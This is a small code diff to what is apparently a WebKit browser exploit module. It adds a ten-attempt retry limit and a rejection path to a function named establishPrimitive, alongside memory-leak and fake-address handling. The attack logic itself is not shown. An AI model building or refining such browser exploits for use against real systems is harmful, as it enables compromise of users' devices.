@@ -25,6 +25,8 @@ let keepIndex = 0
 let keepAlive = null
 let onEvent = null
 let settleResolve = null
+let settleReject = null
+const MAX_ATTEMPTS = 10
 let memoryView = null
 let memoryMirror = null
 let targetView = null
@@ -170,6 +172,13 @@ function retry(reason, safeToRelease, overrideDelay) {
   const nextAttempt = attemptNumber + 1;
   emit("Retry", `${reason} attempt ${nextAttempt}`);
   if (safeToRelease) releaseAttempt();
+  if (nextAttempt > MAX_ATTEMPTS) {
+    const reject = settleReject;
+    settleResolve = null;
+    settleReject = null;
+    if (reject) reject(new Error(`WebKit exploit failed after ${MAX_ATTEMPTS} attempts`));
+    return;
+  }
   const delay = overrideDelay !== undefined ? overrideDelay
     : (safeToRelease ? 2000 : 50);
   setTimeout(() => {
@@ -678,6 +687,7 @@ function finishAttempt(outcome, holderAddress, fakeAddress) {
 
   const resolve = settleResolve;
   settleResolve = null;
+  settleReject = null;
   if (resolve !== null) resolve(createMemoryWindow(holderAddress));
 
   emit("leak_addr", hex(holderAddress + LEAK_SLOT_OFFSET), "info");
@@ -733,8 +743,9 @@ export function establishPrimitive(eventHandler = null) {
 
   attemptNumber = 1;
 
-  return new Promise((resolve) => {
+  return new Promise((resolve, reject) => {
     settleResolve = resolve;
+    settleReject = reject;
     startAttempt();
   });
 }
